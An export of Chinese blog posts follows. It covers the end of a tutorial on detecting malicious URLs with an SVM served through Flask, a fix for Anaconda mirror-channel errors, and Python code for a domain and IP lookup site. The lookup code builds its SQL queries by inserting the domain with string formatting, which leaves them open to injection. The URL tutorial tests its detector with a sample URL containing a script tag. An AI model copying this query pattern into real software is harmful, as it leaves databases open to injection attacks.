class="line">    f2.close()</span><br></pre></td></tr></table></figure><p>通过main方法执行训练模型及保存模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#model,vector=trainLR('data/data.csv')</span></span><br><span class="line">    model, vector = trainSVM(<span class="string">'data/data.csv'</span>)</span><br><span class="line">    saveModel(model,vector)</span><br></pre></td></tr></table></figure><h1 id="四、模型应用"><a href="#四、模型应用" class="headerlink" title="四、模型应用"></a>四、模型应用</h1><p>通过pickle.load载入已经训练好的模型和特征，并用Flask暴露一个接口调用模型的预测方法进行预测。</p><h2 id="载入已经训练好的模型"><a href="#载入已经训练好的模型" class="headerlink" title="载入已经训练好的模型"></a>载入已经训练好的模型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#载入已经训练好的模型</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadModel</span><span class="params">()</span>:</span></span><br><span class="line">    file1 = modelfile_path</span><br><span class="line">    <span class="keyword">with</span> open(file1, <span class="string">'rb'</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        model = pickle.load(f1)</span><br><span class="line">    f1.close()</span><br><span class="line"></span><br><span class="line">    file2 = vectorfile_path</span><br><span class="line">    <span class="keyword">with</span> open(file2, <span class="string">'rb'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        vector = pickle.load(f2)</span><br><span class="line">    f2.close()</span><br><span class="line">    <span class="keyword">return</span> model,vector</span><br></pre></td></tr></table></figure><h2 id="通过接口进行调用"><a href="#通过接口进行调用" class="headerlink" title="通过接口进行调用"></a>通过接口进行调用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过接口进行调用</span></span><br><span class="line"><span class="meta">@app.route('/&lt;path:path&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_predict</span><span class="params">(path)</span>:</span></span><br><span class="line">    X_predict = []</span><br><span class="line">    X_predict.append(path)</span><br><span class="line">    model, vector = loadModel()</span><br><span class="line">    x = vector.transform(X_predict)</span><br><span class="line">    y_predict = model.predict(x)</span><br><span class="line">    print(y_predict[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"url predict: "</span>+str(y_predict[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h1 id="五、应用效果"><a href="#五、应用效果" class="headerlink" title="五、应用效果"></a>五、应用效果</h1><p>将需要检测的URL，输入到<a href="http://127.0.0.1:5000/后面，就可以根据输入的URL进行检测给出模型预测的结果。" target="_blank" rel="noopener">http://127.0.0.1:5000/后面，就可以根据输入的URL进行检测给出模型预测的结果。</a><br><a href="http://127.0.0.1:5000/sohu.com/a/338823532_354899" target="_blank" rel="noopener">http://127.0.0.1:5000/sohu.com/a/338823532_354899</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201209/2-%E6%A8%A1%E5%9E%8B%E9%A2%84%E6%B5%8B%E7%BB%93%E6%9E%9C-%E6%AD%A3%E5%B8%B8.png" alt="检测效果1"><br><a href="http://127.0.0.1:5000/sohu.com/a/%3Cscript%3E/test" target="_blank" rel="noopener">http://127.0.0.1:5000/sohu.com/a/%3Cscript%3E/test</a><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201209/3-%E6%A8%A1%E5%9E%8B%E9%A2%84%E6%B5%8B%E7%BB%93%E6%9E%9C-%E6%81%B6%E6%84%8F.png" alt="检测效果2"></p><p>完整代码及数据集见：<a href="https://github.com/xiejava1018/urldetection.git" target="_blank" rel="noopener">https://github.com/xiejava1018/urldetection.git</a></p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Anaconda报The channel is not accessible源通道不可用问题</title>
      <link href="/posts/d101efba/"/>
      <url>/posts/d101efba/</url>
      
        <content type="html"><![CDATA[<p>最近在通过pycharm开发python程序，引用anaconda环境建立虚拟环境时报错，报UnavailableInvalidChannel: The channel is not accessible or is invalid.应该是镜像源访问通道无法访问或无效。现将解决办法记录如下：</p><h1 id="环境说明："><a href="#环境说明：" class="headerlink" title="环境说明："></a>环境说明：</h1><p>操作系统：win10<br>安装有anaconda 4.10.3<br>pycharm2021.2</p><h1 id="报错现象："><a href="#报错现象：" class="headerlink" title="报错现象："></a>报错现象：</h1><p>在pycharm中新建python项目，引用anaconda建立虚拟环境时报错<br>报“UnavailableInvalidChannel: The channel is not accessible or is invalid.”<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211126/%E6%8A%A5%E9%94%99.png" alt="建立虚拟环境报错"></p><h1 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h1><h2 id="1、找到anaconda的源配置文件"><a href="#1、找到anaconda的源配置文件" class="headerlink" title="1、找到anaconda的源配置文件"></a>1、找到anaconda的源配置文件</h2><p>根据报错的建议提示：</p><blockquote><p>You will need to ajust your conda configuration to proceed.<br>Use ‘cona config –show channels’ to view your configuration’s current state,<br>and use ‘conda config –show-sources’ to view config file location.</p></blockquote><p>意思是建议你需要调整conda的配置来处理，可以通过<code>cona config --show channels</code>命令来查看你当前的配置状态，可以用<code>conda config --show-sources</code>看查看本地的配置文件。<br>根据这个建议，打开anaconda的命令行控制台。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211126/AnacondaPowershell.png" alt="Anaconda Powershell"></p><p>敲入“conda config –show-sources”命令，显示当前的通道为<a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a>  报错就是说这个通道无法访问或无效。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(base) PS C:\Users\xiejava&gt; conda config --show channels</span><br><span class="line">channels:</span><br><span class="line">  - https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>通过“conda config –show-sources” 查看配置文件的路径。配置文件为用户目录下的<code>.condarc</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(base) PS C:\Users\xiejava&gt; conda config --show-sources</span><br><span class="line">==&gt; C:\Users\xiejava\.condarc &lt;==</span><br><span class="line">channels:</span><br><span class="line">  - https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">show_channel_urls: True</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211126/%E6%89%BE%E5%88%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" alt="在这里插入图片描述"></p><h2 id="2、修改为清华的镜像源"><a href="#2、修改为清华的镜像源" class="headerlink" title="2、修改为清华的镜像源"></a>2、修改为清华的镜像源</h2><p>将找到的.condarc文件打开。<br>拷贝以下清华的镜像源到该文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">channels:</span><br><span class="line">  - defaults</span><br><span class="line">custom_channels:</span><br><span class="line">  conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">default_channels:</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2</span><br><span class="line">show_channel_urls: True</span><br></pre></td></tr></table></figure><p>然后再次运行<code>conda config --show-sources</code>，确认配置文件内容已经修改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(base) PS C:\Users\xiejava&gt; conda config --show-sources</span><br><span class="line">==&gt; C:\Users\xiejava\.condarc &lt;==</span><br><span class="line">channels:</span><br><span class="line">  - defaults</span><br><span class="line">custom_channels:</span><br><span class="line">  conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">  simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span><br><span class="line">default_channels:</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r</span><br><span class="line">  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2</span><br><span class="line">show_channel_urls: True</span><br></pre></td></tr></table></figure><h2 id="3、验证"><a href="#3、验证" class="headerlink" title="3、验证"></a>3、验证</h2><p>再打开pycharm引用Conda Enviroment新建新的虚拟环境。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211126/%E5%BB%BA%E7%AB%8B%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83.png" alt="新建新的虚拟环境"><br>这时不报错可以正常创建Conda虚拟环境了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211126/%E5%88%9B%E5%BB%BACondaEnvironment.png" alt="创建Conda Environment"></p><p>至此，修改成清华镜像源解决了Anaconda报The channel is not accessible源通道不可用的问题。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python快速实现一个域名、IP信息聚合网站</title>
      <link href="/posts/fa820ec9/"/>
      <url>/posts/fa820ec9/</url>
      
        <content type="html"><![CDATA[<p>域名和IP地址信息是非常基础的情报信息，目前网上有很多网站都提供了域名信息的查询、IP地址及归属地的查询。本文通过Python Flask实现域名及IP情报信息的聚合网站。</p><p>因为域名和IP地址信息会有变化，为了减少接口压力，做了本地数据库的存储，新鲜度保存一周，每次查询先从本地数据库获取信息，如果本地库信息有并且没有超过一个星期就从本地库取，没有就从其他网站获取，并更新到本地库。</p><h1 id="一、获取域名WHOIS信息"><a href="#一、获取域名WHOIS信息" class="headerlink" title="一、获取域名WHOIS信息"></a>一、获取域名WHOIS信息</h1><p>网上提供域名WHOIS信息查询的网站有很多，这里以<a href="http://whois.chinafu.com" target="_blank" rel="noopener">http://whois.chinafu.com</a> 为例实现WHOIS信息的查询和解析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getwhoisinfobychinafu</span><span class="params">(domain)</span>:</span></span><br><span class="line">    ret_result = &#123;&#125;</span><br><span class="line">    result=getWhoisInfoFromDB(domain)</span><br><span class="line">    <span class="keyword">if</span> len(result)==<span class="number">0</span>:</span><br><span class="line">        whois_service_url = <span class="string">'http://whois.chinafu.com/whois.php'</span></span><br><span class="line">        post_data=&#123;<span class="string">"domain"</span>:domain&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            post_result=requests.post(whois_service_url,post_data)</span><br><span class="line">            <span class="keyword">if</span> post_result.status_code == <span class="number">200</span>:</span><br><span class="line">                ret_str = post_result.content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                soup = BeautifulSoup(ret_str, <span class="string">'lxml'</span>)</span><br><span class="line">                items_tr =soup.find(name=<span class="string">'table'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'listtable'</span>&#125;).find_all(name=<span class="string">'tr'</span>)</span><br><span class="line">                <span class="keyword">for</span> item_tr <span class="keyword">in</span> items_tr:</span><br><span class="line">                    td_item=item_tr.find(name=<span class="string">'td'</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'colspan'</span> <span class="keyword">in</span> td_item.attrs:</span><br><span class="line">                        key_name=<span class="string">'详情'</span></span><br><span class="line">                        key_value=td_item.find(name=<span class="string">'div'</span>,id=<span class="string">'tab1'</span>).text</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        key_name=item_tr.find(name=<span class="string">'th'</span>).text</span><br><span class="line">                        key_value=item_tr.find(name=<span class="string">'td'</span>).text</span><br><span class="line">                    ret_result[key_name]=key_value</span><br><span class="line">                addchinafuWhoisInfo2DB(ret_result)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> r:</span><br><span class="line">            print(<span class="string">'未知错误 %s'</span> % (r))</span><br><span class="line">    <span class="comment">#ret_result = json.dumps(ret_result, ensure_ascii=False)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret_result=result[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> ret_result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getWhoisInfoFromDB</span><span class="params">(domainname)</span>:</span></span><br><span class="line">    whoisInfos=db.session.execute(<span class="string">'select * from whoisinfo where domain_name="%s" and updated_time &gt; DATE_SUB(CURDATE(), INTERVAL 1 WEEK)'</span> % domainname).fetchall()</span><br><span class="line">    whoisInfo_dics=[]</span><br><span class="line">    <span class="keyword">for</span> whoisInfo <span class="keyword">in</span> whoisInfos:</span><br><span class="line">        chinafuwhoisinfo_dic=chinafuwhoisinfo2dic(whoisInfo)</span><br><span class="line">        whoisInfo_dics.append(chinafuwhoisinfo_dic)</span><br><span class="line">    <span class="keyword">return</span> whoisInfo_dics</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addchinafuWhoisInfo2DB</span><span class="params">(chinafuWhoisInfo_dic)</span>:</span></span><br><span class="line">    chinafuWhois=WhoisInfo()</span><br><span class="line">    chinafuWhois.domain_name=chinafuWhoisInfo_dic.get(<span class="string">'域名DomainName'</span>)</span><br><span class="line">    chinafuWhois.domain_status=chinafuWhoisInfo_dic.get(<span class="string">'域名状态Domain Status'</span>,<span class="string">''</span>)</span><br><span class="line">    chinafuWhois.registrar=chinafuWhoisInfo_dic.get(<span class="string">'注册商Sponsoring Registrar'</span>,<span class="string">''</span>)</span><br><span class="line">    chinafuWhois.name_server=chinafuWhoisInfo_dic.get(<span class="string">'DNS 服务器Name Server'</span>,<span class="string">''</span>)</span><br><span class="line">    chinafuWhois.registrar_creation_date=chinafuWhoisInfo_dic.get(<span class="string">'注册日期Registration Date'</span>,<span class="string">''</span>)</span><br><span class="line">    chinafuWhois.registrar_updated_date = chinafuWhoisInfo_dic.get(<span class="string">'更新日期Update Date'</span>, <span class="string">''</span>)</span><br><span class="line">    chinafuWhois.registrar_expiry_date = chinafuWhoisInfo_dic.get(<span class="string">'到期日期Expiration Date'</span>, <span class="string">''</span>)</span><br><span class="line">    chinafuWhois.detail=chinafuWhoisInfo_dic.get(<span class="string">'详情'</span>, <span class="string">''</span>)[<span class="number">0</span>:<span class="number">10000</span>]</span><br><span class="line">    chinafuWhois.source = <span class="string">'中国福网'</span></span><br><span class="line">    db.session.execute(<span class="string">'delete from whoisinfo where domain_name="%s" and source="%s"'</span> % (chinafuWhoisInfo_dic.get(<span class="string">'域名DomainName'</span>), chinafuWhois.source))</span><br><span class="line">    db.session.add(chinafuWhois)</span><br><span class="line">    db.session.commit()</span><br></pre></td></tr></table></figure><p>这里为了减少直接从其他网站获取WHOIS信息的压力，做了本地数据库的存储，每次先从本地数据库取WHOIS的信息，如果本地库信息有并且没有超过一个星期就从本地库取，没有就从其他网站获取，并更新到本地库。这里getWhoisInfoFromDB实现了取新鲜度为1周的数据，addchinafuWhoisInfo2DB实现将获取的信息保存到本地数据库。</p><h1 id="二、根据域名解析出IP"><a href="#二、根据域名解析出IP" class="headerlink" title="二、根据域名解析出IP"></a>二、根据域名解析出IP</h1><p>根据域名解析出IP代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIPbyDomain</span><span class="params">(domain)</span>:</span></span><br><span class="line">    addr=<span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        myaddr = socket.getaddrinfo(domain, <span class="string">'http'</span>)</span><br><span class="line">        addr=myaddr[<span class="number">0</span>][<span class="number">4</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure><h1 id="三、获取IP信息"><a href="#三、获取IP信息" class="headerlink" title="三、获取IP信息"></a>三、获取IP信息</h1><p>获取IP信息的API接口也有很多，有淘宝的 <a href="https://ip.taobao.com/outGetIpInfo" target="_blank" rel="noopener">https://ip.taobao.com/outGetIpInfo</a>  、IPINFO <a href="http://ipinfo.io/、IPAPI" target="_blank" rel="noopener">http://ipinfo.io/、IPAPI</a> <a href="http://ip-api.com/" target="_blank" rel="noopener">http://ip-api.com/</a>  以及GeoLite2离线库等。</p><h2 id="从淘宝IP获取IP信息"><a href="#从淘宝IP获取IP信息" class="headerlink" title="从淘宝IP获取IP信息"></a>从淘宝IP获取IP信息</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getipinfobytaobao</span><span class="params">(ip)</span>:</span></span><br><span class="line">    taobaoIp_url = <span class="string">'https://ip.taobao.com/outGetIpInfo'</span></span><br><span class="line">    post_data=&#123;<span class="string">"ip"</span>:ip,<span class="string">"accessKey"</span>:<span class="string">"alibaba-inc"</span>&#125;</span><br><span class="line">    ret_ipinfo= &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        return_data=requests.post(taobaoIp_url,post_data)</span><br><span class="line">        <span class="comment">#其中返回数据中code的值的含义为，0：成功，1：服务器异常，2：请求参数异常，3：服务器繁忙，4：个人qps超出</span></span><br><span class="line">        return_json=json.loads(return_data.text)</span><br><span class="line">        <span class="keyword">if</span> return_json[<span class="string">'code'</span>]==<span class="number">0</span>:</span><br><span class="line">            ret_ipinfo[<span class="string">'ip'</span>]=return_json[<span class="string">'data'</span>][<span class="string">'ip'</span>]</span><br><span class="line">            ret_ipinfo[<span class="string">'country'</span>]=return_json[<span class="string">'data'</span>][<span class="string">'country'</span>]</span><br><span class="line">            ret_ipinfo[<span class="string">'region'</span>]=return_json[<span class="string">'data'</span>][<span class="string">'region'</span>]</span><br><span class="line">            ret_ipinfo[<span class="string">'org'</span>]=<span class="string">''</span></span><br><span class="line">            ret_ipinfo[<span class="string">'city'</span>] = return_json[<span class="string">'data'</span>][<span class="string">'city'</span>]</span><br><span class="line">            ret_ipinfo[<span class="string">'isp'</span>]=return_json[<span class="string">'data'</span>][<span class="string">'isp'</span>]</span><br><span class="line">            ret_ipinfo[<span class="string">'loc'</span>] = <span class="string">''</span></span><br><span class="line">            ret_ipinfo[<span class="string">'timezone'</span>] = <span class="string">''</span></span><br><span class="line">            ret_ipinfo[<span class="string">'source'</span>]=<span class="string">'淘宝IP'</span></span><br><span class="line">            addIPInfo2DB(ret_ipinfo)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'未知错误 %s'</span> % (e))</span><br><span class="line">    <span class="keyword">return</span> ret_ipinfo</span><br></pre></td></tr></table></figure><h2 id="从ipinfo-io获取IP信息"><a href="#从ipinfo-io获取IP信息" class="headerlink" title="从ipinfo.io获取IP信息"></a>从ipinfo.io获取IP信息</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getipinfobyipinfo</span><span class="params">(ip)</span>:</span></span><br><span class="line">    api_url=<span class="string">'http://ipinfo.io/'</span>+ip</span><br><span class="line">    ipinfo = &#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req_return = requests.get(api_url)</span><br><span class="line">        <span class="keyword">if</span> req_return.status_code == <span class="number">200</span>:</span><br><span class="line">            ipinfo = json.loads(req_return.text)</span><br><span class="line">            ipinfo[<span class="string">'source'</span>]=<span class="string">'ipinfo.io'</span></span><br><span class="line">            addIPInfo2DB(ipinfo)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'未知错误 %s'</span> % (e))</span><br><span class="line">    <span class="keyword">return</span> ipinfo</span><br></pre></td></tr></table></figure><h2 id="从ip-api-com获取IP信息"><a href="#从ip-api-com获取IP信息" class="headerlink" title="从ip-api.com获取IP信息"></a>从ip-api.com获取IP信息</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getipinfobyipapi</span><span class="params">(ip)</span>:</span></span><br><span class="line">    api_url=<span class="string">'http://ip-api.com/json/'</span>+ip</span><br><span class="line">    ipinfo=&#123;&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req_return=requests.get(api_url)</span><br><span class="line">        <span class="keyword">if</span> req_return.status_code==<span class="number">200</span>:</span><br><span class="line">            ipinfo=json.loads(req_return.text)</span><br><span class="line">            ipinfo[<span class="string">'ip'</span>] = ip</span><br><span class="line">            ipinfo[<span class="string">'source'</span>] = <span class="string">'ip-api.com'</span></span><br><span class="line">            ipinfo[<span class="string">'loc'</span>] = str(ipinfo[<span class="string">'lat'</span>])+<span class="string">','</span>+str(ipinfo[<span class="string">'lon'</span>])</span><br><span class="line">            addIPInfo2DB(ipinfo)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'未知错误 %s'</span> % (e))</span><br><span class="line">    <span class="keyword">return</span> ipinfo</span><br></pre></td></tr></table></figure><h2 id="从GeoLite离线库获取IP信息"><a href="#从GeoLite离线库获取IP信息" class="headerlink" title="从GeoLite离线库获取IP信息"></a>从GeoLite离线库获取IP信息</h2><p>如何获取GeoLite离线库及如何读取，详见：<a href="http://xiejava.ishareread.com/posts/2c5697c0/" target="_blank" rel="noopener">http://xiejava.ishareread.com/posts/2c5697c0/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getipinfobygeoip2</span><span class="params">(ip)</span>:</span></span><br><span class="line">    ipinfo=&#123;&#125;</span><br><span class="line">    dbdir=Config.geoLiteDBdir</span><br><span class="line">    <span class="keyword">with</span> geoip2.database.Reader(dbdir) <span class="keyword">as</span> reader:</span><br><span class="line">        response = reader.city(ip)</span><br><span class="line">        ipinfo[<span class="string">'ip'</span>] =ip</span><br><span class="line">        ipinfo[<span class="string">'country'</span>] = response.country.names[<span class="string">'zh-CN'</span>]</span><br><span class="line">        ipinfo[<span class="string">'region'</span>] =<span class="string">''</span></span><br><span class="line">        ipinfo[<span class="string">'city'</span>]=response.city.name</span><br><span class="line">        ipinfo[<span class="string">'org'</span>] =<span class="string">''</span></span><br><span class="line">        ipinfo[<span class="string">'loc'</span>] = str(response.location.latitude)+<span class="string">','</span>+str(response.location.longitude)</span><br><span class="line">        ipinfo[<span class="string">'timezone'</span>] = response.location.time_zone</span><br><span class="line">        ipinfo[<span class="string">'source'</span>] = <span class="string">'GeoIP'</span></span><br><span class="line">        addIPInfo2DB(ipinfo)</span><br><span class="line">    